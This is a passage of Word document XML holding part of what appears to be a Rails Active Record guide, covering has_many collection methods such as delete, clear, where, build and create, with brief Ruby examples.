    </w:tbl>
    <w:p w14:paraId="76756A8D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.delete(object, …)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11859CAF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.delete</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method removes one or more objects from the collection by setting their foreign keys to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4056"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="0BFDFC2C" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4DD8A9FC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1205217577"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@customer.orders.delete(@order1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29BFCC5F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Additionally, objects will be destroyed if they’re associated with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent =&gt; :destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and deleted if they’re associated with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent =&gt; :delete_all</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E102EAE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=objects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DDB9EB5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method makes the collection contain only the supplied objects, by adding and deleting as appropriate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6442E5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A672D6C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns an array of the ids of the objects in the collection.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3984"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="6EEDDBE8" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="73466717" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1411192662"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@order_ids</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @customer.order_ids</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="361A4B8B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids=ids</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D0DB81" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids=</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method makes the collection contain only the objects identified by the supplied primary key values, by adding and deleting as appropriate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C81ACB1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.clear</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CAF16C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.clear</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method removes every object from the collection. This destroys the associated objects if they are associated with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent =&gt; :destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, deletes them directly from the database if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent =&gt; :delete_all</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and otherwise sets their foreign keys to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759C7E05" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.empty?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9B7217" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.empty?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if the collection does not contain any associated objects.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3984"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="4C8543D4" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5974A1F6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;% if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@customer.orders.empty? %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A7650C0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  No Orders Found</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5804D5A7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;% end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F8805E4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1056C88F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns the number of objects in the collection.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4464"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="25342C45" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C58C96C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="964310522"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@order_count</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @customer.orders.size</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5D932C9B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.find(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72231278" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method finds objects within the collection. It uses the same syntax and options as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base.find</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4824"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="7B291B64" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46886F78" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="318195314"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@open_orders</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @customer.orders.find(1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="730CD27F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.where(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF4460D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method finds objects within the collection based on the conditions supplied but the objects are loaded lazily meaning that the database is queried only when the object(s) are accessed.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8184"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="7F5ED7EF" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F303A90" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@open_orders</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @customer.orders.where(:open</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true) # No query yet</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="684377FB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@open_order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @open_orders.first # Now the database will be queried</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="748EE069" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.exists?(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28440E43" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.exists?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method checks whether an object meeting the supplied conditions exists in the collection. It uses the same syntax and options as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base.exists?</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E3EC64" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.build(attributes = {}, …)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F0A02E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.build</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns one or more new objects of the associated type. These objects will be instantiated from the passed attributes, and the link through their foreign key will be created, but the associated objects will </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> yet be saved.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6791"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="6241445B" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="613DD51B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @customer.orders.build(:order_date</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; Time.now,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C256931" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :order_number</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "A12345")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7CE842CD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.create(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7557BA51" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns a new object of the associated type. This object will be instantiated from the passed attributes, the link through its foreign key will be created, and, once it passes all of the validations specified on the associated model, the associated object </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>will</w:t>
      </w:r>
      <w:r>
